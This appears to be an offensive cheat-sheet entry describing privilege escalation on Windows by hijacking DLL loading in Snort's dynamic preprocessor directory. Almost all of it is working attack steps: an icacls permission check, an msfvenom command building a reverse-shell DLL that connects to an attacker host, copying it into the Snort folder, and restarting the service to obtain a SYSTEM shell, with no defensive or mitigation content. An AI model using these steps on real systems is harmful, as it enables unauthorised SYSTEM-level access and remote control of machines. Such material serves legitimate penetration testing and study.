# Snort dynamicpreprocessor DLL Hijack

Snort loads DLLs from `C:\Snort\lib\snort_dynamicpreprocessor\`. If this directory is writable, drop a malicious DLL there; it loads as SYSTEM when Snort restarts.

## Check Permissions

```powershell
icacls "C:\Snort\lib\snort_dynamicpreprocessor"
# Look for: BUILTIN\Users:(F) or current user with (W)
```

## Generate DLL Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o sf_engine.dll
```

## Deploy

```powershell
copy sf_engine.dll "C:\Snort\lib\snort_dynamicpreprocessor\sf_engine.dll"
```

Wait for Snort service restart (scheduled task, reboot, or manual). DLL is loaded by the Snort process running as SYSTEM.

## Trigger Restart (if service account allows)

```powershell
Restart-Service snort
# or:
sc stop snort; sc start snort
```

## Notes

- Any DLL in the directory is loaded; naming doesn't matter as long as it has a valid DLL format
- Snort service typically runs as LocalSystem — shell will be SYSTEM
- Also check `C:\Snort\lib\snort_dynamicengine\` and `C:\Snort\lib\snort_dynamicrules\`
